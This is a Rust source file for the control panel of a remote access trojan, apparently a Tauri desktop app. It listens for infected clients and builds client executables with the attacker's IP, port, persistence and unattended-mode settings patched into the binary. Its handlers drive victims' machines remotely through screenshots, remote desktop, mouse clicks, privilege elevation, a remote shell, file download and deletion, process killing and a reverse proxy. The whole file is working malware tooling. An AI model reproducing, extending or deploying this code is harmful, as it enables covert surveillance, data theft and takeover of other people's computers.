use tauri::State;
use crate::handlers::{ SharedTauriState, FrontClient };
use crate::server::Log;
use serde::Serialize;
use object::{ Object, ObjectSection };
use std::fs::{ self, File };
use std::io::Write;
use std::vec;

use tokio::net::TcpListener;
use tokio::sync::mpsc;
use tokio::sync::mpsc::Sender;
use crate::commands::ServerCommand;
use crate::server::ServerWrapper;
use crate::client::ClientWrapper;

use std::ptr::null_mut as NULL;
use winapi::um::winuser;

use rmp_serde::Serializer;
use tauri::AppHandle;

use once_cell::sync::OnceCell;

use common::packets::{RemoteDesktopConfig, MouseClickData, VisitWebsiteData, MessageBoxData, Process, FileData};

pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>) -> Result<Sender<ServerCommand>, String> {
    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    Ok(channel_tx)
}

#[tauri::command]
pub async fn start_server(
    port: &str,
    tauri_state: State<'_, SharedTauriState>,
    app_handle: AppHandle,
) -> Result<String, String> {
    let (ctx, crx) = mpsc::channel::<ServerCommand>(32);
    
    {
        let mut tauri_state = tauri_state.0.lock().unwrap();
        
        if tauri_state.channel_tx.set(ctx.clone()).is_err() {
            return Err("false".to_string());
        }
        
        tauri_state.running = true;
        tauri_state.port = port.to_string();
    };
    
    ctx.send(ServerCommand::SetTauriHandle(app_handle))
       .await
       .map_err(|e| format!("Failed to set Tauri handle: {}", e))?;


    let log = Log { event_type: "server_started".to_string(), message: "Server started on port ".to_string() + port, address: "0.0.0.0".to_string(), status: "started".to_string() };
    ctx.send(ServerCommand::Log(log)).await.unwrap();
    
    let server_task = tokio::spawn(async move {
        match ServerWrapper::spawn(crx).await {
            Ok(_) => println!("Server started successfully"),
            Err(e) => eprintln!("Failed to start server: {}", e),
        }
    });

    let ctx_for_listener = ctx.clone();

    let port = port.parse::<u16>().unwrap();


    let listener_task = tokio::spawn(async move {
        match TcpListener::bind(("0.0.0.0", port)).await {
            Ok(listener) => {
                loop {
                    match listener.accept().await {
                        Ok((socket, addr)) => {
                            let ctx = ctx_for_listener.clone();
                            ClientWrapper::spawn(socket, addr, ctx).await;
                        },
                        Err(e) => {
                            eprintln!("Error accepting connection: {}", e);
                            break;
                        }
                    }
                }
            },
            Err(e) => {
                eprintln!("Failed to bind to port {}: {}", port, e);
            }
        }
    });


    {
        let mut tauri_state = tauri_state.0.lock().unwrap();
        tauri_state.server_task = Some(server_task);
        tauri_state.listener_task = Some(listener_task);
    }


    Ok("true".to_string())
}


#[tauri::command]
pub async fn stop_server(tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
    { 
        let channel_tx = {
            let mut tauri_state = tauri_state.0.lock().unwrap();
            
            if !tauri_state.running {
                return Ok("false".to_string());
            }
            
            tauri_state.running = false;

            if let Some(tx) = tauri_state.channel_tx.get() {
                tx.clone()
            } else {
                return Err("Server channel not initialized".to_string());
            }
        };
        
        channel_tx.send(ServerCommand::CloseClientSessions())
            .await
            .map_err(|e| format!("Failed to send CloseClientSessions command: {}", e))?;
        
    }

    {
        let mut tauri_state = tauri_state.0.lock().unwrap();

        if let Some(listener_task) = tauri_state.listener_task.take() {
            listener_task.abort();
        }


        if let Some(listener_task) = tauri_state.listener_task.take() {
            listener_task.abort();
        }
        
        tauri_state.channel_tx = OnceCell::new();
        tauri_state.server_task = None;
        tauri_state.listener_task = None;
    }

    Ok("true".to_string())
}

#[derive(Serialize)]
pub struct FrontRATState {
    running: bool,
    port: String
}

#[tauri::command]
pub async fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> Result<FrontRATState, FrontRATState> {
    let tauri_state = tauri_state.0.lock().unwrap();
    Ok(FrontRATState {
        running: tauri_state.running.clone(),
        port: tauri_state.port.clone()
    })
}

#[tauri::command]
pub fn build_client(
    ip: &str,
    port: &str,
    mutex_enabled: bool,
    mutex: &str,
    unattended_mode: bool,
    startup: bool
) {
    let bin_data = fs::read("target/debug/client.exe").unwrap();
    let file = object::File::parse(&*bin_data).unwrap();

    let mut output_data = bin_data.clone();

    let config = common::ClientConfig {
        ip: ip.to_string(),
        port: port.to_string(),
        mutex_enabled,
        mutex: mutex.to_string(),
        unattended_mode,
        startup,
    };

    let mut buffer: Vec<u8> = Vec::new();

    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();

    let mut new_data = vec![0u8; 1024];

    for (i, byte) in buffer.iter().enumerate() {
        new_data[i] = *byte;
    }

    if let Some(section) = file.section_by_name(".zzz") {
        let offset = section.file_range().unwrap().0 as usize;
        let size = section.size() as usize;

        output_data[offset..offset + size].copy_from_slice(&new_data);
    }

    let mut file = File::create("target/debug/Client_built.exe").unwrap();
    let _ = file.write_all(&output_data);
}

#[tauri::command]
pub async fn fetch_clients(
    tauri_state: State<'_, SharedTauriState>
) -> Result<Vec<FrontClient>, String> {
    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Ok(vec![]);
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    let (tx, rx) = tokio::sync::oneshot::channel();
    
    channel_tx.send(ServerCommand::GetClients(tx))
        .await
        .map_err(|e| format!("Failed to send GetClients command: {}", e))?;
    
    match rx.await {
        Ok(clients) => Ok(clients),
        Err(e) => Err(format!("Failed to receive client list: {}", e)),
    }
}

#[tauri::command]
pub async fn fetch_client(
    addr: String, 
    tauri_state: State<'_, SharedTauriState>
) -> Result<FrontClient, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;
    
    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };
    
    let (tx, rx) = tokio::sync::oneshot::channel();
    
    channel_tx.send(ServerCommand::GetClient(socket_addr, tx))
        .await
        .map_err(|e| format!("Failed to send GetClient command: {}", e))?;
    
    match rx.await {
        Ok(Some(client)) => Ok(client),
        Ok(None) => Err(format!("Client with address {} not found", addr)),
        Err(e) => Err(format!("Failed to receive client info: {}", e)),
    }
}

#[tauri::command]
pub async fn take_screenshot(
    addr: String, 
    display: i32, 
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;
    
    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };
    
    channel_tx.send(ServerCommand::TakeScreenshot(socket_addr, display.to_string()))
        .await
        .map_err(|e| e.to_string())?;
        
    Ok("Screenshot requested".to_string())
}

#[tauri::command]
pub async fn manage_client(addr: String, run: &str, tauri_state: State<'_, SharedTauriState>) -> Result<(), String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;
    
    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    match run {
        "disconnect" => {
            channel_tx.send(ServerCommand::DisconnectClient(socket_addr))
                .await
                .map_err(|e| format!("Failed to send DisconnectClient command: {}", e))?;
        }
        "reconnect" => {
            channel_tx.send(ServerCommand::ReconnectClient(socket_addr))
                .await
                .map_err(|e| format!("Failed to send ReconnectClient command: {}", e))?;
        }
        _ => {}
    }

    Ok(())
}

#[tauri::command]
pub async fn start_remote_desktop(
    addr: &str, 
    display: i32, 
    quality: u8, 
    fps: u8, 
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::StartRemoteDesktop(socket_addr, RemoteDesktopConfig {
        display,
        quality,
        fps,
    }))
    .await
    .map_err(|e| e.to_string())?;

    Ok("Remote desktop started".to_string())
}

#[tauri::command]
pub async fn stop_remote_desktop(
    addr: &str, 
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
    .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::StopRemoteDesktop(socket_addr))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Remote desktop stopped".to_string())
}

#[tauri::command]
pub async fn send_mouse_click(
    addr: &str,
    display: i32,
    x: i32,
    y: i32,
    click_type: i32,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
    .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::MouseClick(socket_addr, MouseClickData {
        display,
        x: x as i32,
        y: y as i32,
        click_type,
    }))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Mouse click sent".to_string())
}

#[tauri::command]
pub async fn visit_website(
    addr: &str,
    url: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }

        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::VisitWebsite(socket_addr, VisitWebsiteData {
        visit_type: "normal".to_string(),
        url: url.to_string(),
    }))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Website visited".to_string())
}

#[tauri::command]
pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
    let l_msg: Vec<u16> = format!("{}\0", message).encode_utf16().collect();
    let l_title: Vec<u16> = format!("{}\0", title).encode_utf16().collect();

    unsafe {
        winuser::MessageBoxW(
            NULL(),
            l_msg.as_ptr(),
            l_title.as_ptr(),
            (match button {
                "ok" => winuser::MB_OK,
                "ok_cancel" => winuser::MB_OKCANCEL,
                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
                "yes_no" => winuser::MB_YESNO,
                "retry_cancel" => winuser::MB_RETRYCANCEL,
                _ => winuser::MB_OK,
            }) |
                (match icon {
                    "info" => winuser::MB_ICONINFORMATION,
                    "warning" => winuser::MB_ICONWARNING,
                    "error" => winuser::MB_ICONERROR,
                    "question" => winuser::MB_ICONQUESTION,
                    "asterisk" => winuser::MB_ICONASTERISK,
                    _ => winuser::MB_ICONINFORMATION,
                })
        );
    }
}

#[tauri::command]
pub async fn send_messagebox(
    addr: &str,
    title: &str,
    message: &str,
    button: &str,
    icon: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }

        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::ShowMessageBox(socket_addr, MessageBoxData {
        title: title.to_string(),
        message: message.to_string(),
        button: button.to_string(),
        icon: icon.to_string(),
    })) 
        .await
        .map_err(|e| e.to_string())?;

    Ok("Messagebox sent".to_string())
}

#[tauri::command]
pub async fn elevate_client(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }

        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::ElevateClient(socket_addr))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Client elevated".to_string())
}

#[tauri::command]
pub async fn handle_system_command(
    addr: &str,
    run: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = {
        let tauri_state = tauri_state.0.lock().unwrap();
        
        if !tauri_state.running {
            return Err("Server not running".to_string());
        }
        
        if let Some(tx) = tauri_state.channel_tx.get() {
            tx.clone()
        } else {
            return Err("Server channel not initialized".to_string());
        }
    };

    channel_tx.send(ServerCommand::ManageSystem(socket_addr, run.to_string()))
        .await
        .map_err(|e| e.to_string())?;

    Ok("System command sent".to_string())
}

#[tauri::command]
pub async fn process_list(
    addr: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    channel_tx.send(ServerCommand::GetProcessList(socket_addr))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Process list sent".to_string())
}

#[tauri::command]
pub async fn kill_process(
    addr: &str,
    pid: i32,
    name: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    channel_tx.send(ServerCommand::KillProcess(socket_addr, Process {
        pid: pid as usize,
        name: name.to_string(),
    }))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Process killed".to_string())
}

#[tauri::command]
pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;
    
    match run {
        "start" => {
            channel_tx.send(ServerCommand::StartShell(socket_addr))
                .await
                .map_err(|e| e.to_string())?;
        }
        "stop" => {
            channel_tx.send(ServerCommand::ExitShell(socket_addr))
                .await
                .map_err(|e| e.to_string())?;
        }
        _ => {}
    }

    Ok("Shell command sent".to_string())
}

#[tauri::command]
pub async fn execute_shell_command(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    channel_tx.send(ServerCommand::ShellCommand(socket_addr, run.to_string()))
        .await
        .map_err(|e| e.to_string())?;   
    
    Ok("Shell command sent".to_string())
}

#[tauri::command]
pub async fn read_files(
    addr: &str,
    run: &str,
    path: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    match run {
        "previous_dir" => {
            channel_tx.send(ServerCommand::PreviousDir(socket_addr))
                .await
                .map_err(|e| e.to_string())?;
        }
        "view_dir" => {
            channel_tx.send(ServerCommand::ViewDir(socket_addr, path.to_string()))
                .await
                .map_err(|e| e.to_string())?;
        }
        "available_disks" => {
            channel_tx.send(ServerCommand::AvailableDisks(socket_addr))
                .await
                .map_err(|e| e.to_string())?;
        }
        _ => {}
    }

    Ok("File operation sent".to_string())
}


#[tauri::command]
pub async fn manage_file(
    addr: &str,
    run: &str,
    file: &str,
    tauri_state: State<'_, SharedTauriState>
) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    match run {
        "download_file" => {
            channel_tx.send(ServerCommand::DownloadFile(socket_addr, file.to_string()))
                .await
                .map_err(|e| e.to_string())?;
        }
        "remove_file" => {
            channel_tx.send(ServerCommand::RemoveFile(socket_addr, file.to_string()))
                .await
                .map_err(|e| e.to_string())?;
        }
        "remove_dir" => {
            channel_tx.send(ServerCommand::RemoveDir(socket_addr, file.to_string()))
                .await
                .map_err(|e| e.to_string())?;
        }
        _ => {}
    }

    Ok("File operation sent".to_string())
}
    
#[tauri::command]
pub async fn start_reverse_proxy(addr: &str, port: &str, localport: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    channel_tx.send(ServerCommand::StartReverseProxy(socket_addr, port.to_string(), localport.to_string()))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Reverse proxy started".to_string())
}

#[tauri::command]
pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriState>) -> Result<String, String> {
    let socket_addr = addr.parse()
        .map_err(|e| format!("Invalid socket address: {}", e))?;

    let channel_tx = get_channel_tx(tauri_state).await?;

    channel_tx.send(ServerCommand::StopReverseProxy(socket_addr))
        .await
        .map_err(|e| e.to_string())?;

    Ok("Reverse proxy stopped".to_string())
}
